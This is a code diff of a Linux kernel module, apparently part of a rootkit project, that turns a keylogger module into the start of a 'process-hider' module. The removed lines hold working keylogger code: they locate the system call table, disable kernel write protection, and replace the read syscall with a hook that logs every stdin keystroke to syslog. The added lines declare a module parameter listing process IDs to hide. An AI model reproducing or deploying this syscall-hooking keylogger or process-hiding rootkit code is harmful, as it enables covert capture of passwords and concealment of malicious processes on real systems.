@@ -8,31 +8,20 @@
 #include "sysmap.h"
 #include <linux/unistd.h>
 
-void **sys_call_table;
+/* Information for modinfo */
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");
 
-asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);
 
-/*
- * Our manipulated read syscall. It will print every keystroke to the syslog
- * and call the original read afterwards.
- */
-asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t count)
-{
-	long ret;
-	ret = original_read(fd,buf,count);
-	
-	//read from stdin and print it using printk
-	if(ret >= 1 && fd == 0)
-	{
-		int i;
-		for(i = 0; i < ret; i++)
-		{
-			printk(KERN_INFO "[Keylogger] '%c' (0x%02x)\n", buf[i], buf[i]);
-		}
-	}
 
-	return ret;
-}
+/* Define module parameters */
+static int hideprocess_argcount = 0;
+static pid_t hideprocess_processes[16] = {-1, -1, -1 , -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
+
+module_param_array(hideprocess_processes, pid_t, hideprocess_argcount, 0000);
+MODULE_PARM_DESC(hideprocess_processes, "An array of process ids to hide");
+
+
 
 /*
  * Disable the writing protection for the whole processor.
@@ -68,24 +57,8 @@ static void enable_page_protection (void)
  */
 int init_module (void)
 {
-	printk(KERN_INFO "Loading keylogger LKM...\n");
+	printk(KERN_INFO "Loading process-hider LKM...\n");
 	
-	/* get the location of the sys_call_table from our sysmap.h file */
-	sys_call_table = (void*) sysmap_sys_call_table;
-	
-	/* disable the write-protection */
-	disable_page_protection();
-	
-	/* 
-	 * keep pointer to original function in original_read, and 
-	 * replace the system call in the system call table with
-	 * manipulated_read 
-	 */
-	original_read = (void *)sys_call_table[__NR_read];
-	sys_call_table[__NR_read] = (unsigned long*)manipulated_read;
-	
-	/* reenable the write-protection */
-	enable_page_protection();	
 	return 0;
 }
 
@@ -95,14 +68,8 @@ int init_module (void)
  */
 void cleanup_module (void)
 {
-	printk(KERN_INFO "Unloading keylogger... bye!\n");
 
-	/* disable the write-protection */	
-	disable_page_protection();
 
-	/* Return the system call back to original */
-	sys_call_table[__NR_read] = (unsigned long *)original_read;
-
-	/* reenable the write-protection */
-	enable_page_protection();	
+	/* Finally, log the unloading */
+	printk(KERN_INFO "Unloading process-hider... bye!\n");
 }
